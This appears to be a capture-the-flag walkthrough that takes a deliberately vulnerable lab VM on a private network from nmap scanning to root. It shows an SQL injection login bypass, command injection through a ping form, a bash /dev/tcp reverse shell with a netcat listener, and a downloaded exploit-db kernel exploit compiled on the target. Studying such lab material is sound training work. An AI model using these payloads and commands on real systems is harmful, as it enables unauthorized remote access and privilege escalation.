### Solved without using Metasploit

Let Host discovery from Attack machine , run `ifconifg` and note our machine ip `192.168.69.5` , so network IP range will be `192.168.69.0` - `192.168.69.255` with subnet of `255:225:225:0`

`-sn` Ping Scan Disable port

```
nmap -sn 192.168.69.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 00:33 CDT
Nmap scan report for 192.168.69.5
Host is up (0.00014s latency).
Nmap scan report for 192.168.69.8                   <<<<<< vuln machine
Host is up (0.00026s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 16.14 seconds
```

we got machine running on 192.168.69.8

<img src="../img/Pasted image 20240529110428.png" alt="Example Image" width="1080"/>

Version Scan

```
nmap -sV 192.168.69.8

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 00:34 CDT
Nmap scan report for 192.168.69.8
Host is up (0.00040s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
3306/tcp open  mysql    MySQL (unauthorized)
```

Aggressive And Fast Scanning

```
nmap -AF 192.168.69.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 00:36 CDT
Nmap scan report for 192.168.69.8
Host is up (0.0011s latency).
Not shown: 94 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            651/udp   status
|_  100024  1            654/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_ssl-date: 2024-05-29T09:37:24+00:00; +4h00m00s from scanner time.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)

Host script results:
|_clock-skew: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.58 seconds
```

as we know machine running MySQL Server , we can try for SQL Injection

<img src="../img/Pasted image 20240529110941.png" alt="Example Image" width="1080"/>

It works !!! , Its is just simple SQL Injection.

<img src="../img/Pasted image 20240529111227.png" alt="Example Image" width="1080"/>

Website doesn't have potential information so let explore more. click view page source

<img src="../img/Pasted image 20240529112112.png" alt="Example Image" width="1080"/>

it looks like the page structure has been broken , copy below corrected tag

```
<td align='center'>
                <input type="text" name="ip" size="30">
                <input type="submit" value="submit" name="submit">
            </td>
```

go to inspect tool and choose edit as html , paste above tags

<img src="../img/Pasted image 20240529112345.png" alt="Example Image" width="1080"/>

Refresh the page using F5

<img src="../img/Pasted image 20240529112449.png" alt="Example Image" width="1080"/>

we got a Input field , as previous text say `ping a machine` ,

<img src="../img/Pasted image 20240529112507.png" alt="Example Image" width="1080"/>

Enter our machine IP , `192.168.69.5`

<img src="../img/Pasted image 20240529112557.png" alt="Example Image" width="1080"/>

It's looks like command line execution take through that input field

<img src="../img/Pasted image 20240529114403.png" alt="Example Image" width="1080"/>

I have checked this by appending `;ls;whoami;id`

<img src="../img/Pasted image 20240529114415.png" alt="Example Image" width="1080"/>

I worked, this assures , this is cli execution

<img src="../img/Pasted image 20240529114458.png" alt="Example Image" width="1080"/>

I even viewed `pingit.php` file

<img src="../img/Pasted image 20240529114509.png" alt="Example Image" width="1080"/>

```php

        echo shell_exec( 'ping -c 3 ' . $target );
        echo '

'; } ?>
```

Let Write Payload to obtain a reverse shell by this reference , https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e

```
bash -i >& /dev/tcp/<attacker IP>/<attacker port> 0>&1
```

Let Start Listen using netcat on port 4545

```
┌──(voidgojo㉿voidgojo)-[~]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
```

Execute this on the input field

```
;bash -i >& /dev/tcp/192.168.69.5/4545 0>&1
```

<img src="../img/Pasted image 20240529115815.png" alt="Example Image" width="1080"/>

We Got Shell !!! but not root privilege escalate d , Let escalate before that gather info about machine through CLI

<img src="../img/Pasted image 20240529115847.png" alt="Example Image" width="1080"/>

```
bash-3.00$ lsb_release -a
LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
Codename:       Final
bash-3.00$
```

We got the OS information , EXPLOIT Link for above CentOS https://www.exploit-db.com/exploits/9542 download that file and locate

<img src="../img/Pasted image 20240530172901.png" alt="Example Image" width="1080"/>

I Made HTTP Server on LAN in order to push that file into target machine

<img src="../img/Pasted image 20240530173311.png" alt="Example Image" width="1080"/>

On Target Machine

```
cd /tmp
wget http://192.168.69.5/9542.c
```

<img src="../img/Pasted image 20240530173855.png" alt="Example Image" width="1080"/>

```
chmod 700 9542.c
gcc -o exploit 9542.c
./exploit
```

<img src="../img/Pasted image 20240530174112.png" alt="Example Image" width="1080"/>
We got the root flag
